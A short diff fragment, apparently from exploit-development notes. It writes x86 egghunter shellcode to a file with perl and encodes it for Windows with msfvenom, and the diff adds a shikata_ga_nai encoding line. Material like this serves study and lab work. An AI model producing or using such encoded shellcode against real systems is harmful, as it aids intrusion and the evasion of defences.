@@ -57,3 +57,5 @@ in /bin:
  
 perl -e 'print "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x74\xF0\x89\xD7\xAF\x75\xF0\xAF\x75\xED\xB8\x90\x50\x90\x50\xFF\xE7"' > exploit.bin
 cat exploit.bin | /usr/bin/msfvenom -p - -a x86 --platform windows -e x86/alpha_mixed -f python
+cat exploit.bin | /usr/bin/msfvenom -p - -a x86 --platform windows -e x86/shikata_ga_nai -f python
+
